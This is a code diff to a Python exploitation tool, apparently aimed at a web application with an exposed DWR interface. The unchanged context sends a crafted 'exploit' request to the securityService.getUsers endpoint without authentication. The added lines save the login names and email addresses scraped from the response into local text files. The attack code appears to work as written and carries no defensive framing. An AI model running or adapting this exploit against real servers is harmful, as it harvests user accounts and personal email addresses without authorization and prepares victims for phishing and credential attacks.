@@ -120,9 +120,13 @@ class Cofe:
         #print(r.text)
         if "200" in str(r) and not "404" in r.text:
             print(vulnerable("[+] Getting Possible logins... \n"))
+            f = open('./users-file.txt', 'w')
             for m in re.findall(r'name="(\w*)"', r.text):
                 print("[+] Possible user: {}".format(str(m)))
+                f.write(m+"\n")
         print(notice("[+] Finish all possible logins were got.. \n"))
+        print(notice("[+] created a file.. ( user-file.txt ) with all users collected \n"))
+        f.close()    
 
 
 
@@ -130,12 +134,15 @@ class Cofe:
         exploit = {"callCount":1,"page":"/dwr-view/test/userService","httpSessionId":"","scriptSessionId":'15467B75AB0FF3158D39ADF6D866C078381',
         "c0-scriptName":"securityService","c0-methodName":"getUsers", "c0-id":0, "c0-param0":"number:0", "c0-param1":"boolean:false", "batchId":2}
         r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, verify=False)
+        f = open('./mails-file.txt', 'w')
         if "200" in str(r) and not "404" in r.text:
             print(vulnerable("\n[+] Getting Emails... \n"))
             for m in re.findall(r'email="([\w\.-]+@[\w\.-]+)"', r.text):
                 print("[+] Possible email: {}".format(str(m)))
+                f.write(m+"\n")
         print(notice("[+] Finish all possible mails were got.. \n"))
-    
+        print(notice("[+] created a file.. ( mails-file.txt ) with all emails collected \n"))
+        f.close()
 
 
     def XptGetURemainder(self):
@@ -151,6 +158,7 @@ class Cofe:
                 print(r2.text)
 
 
+    
 
 
 
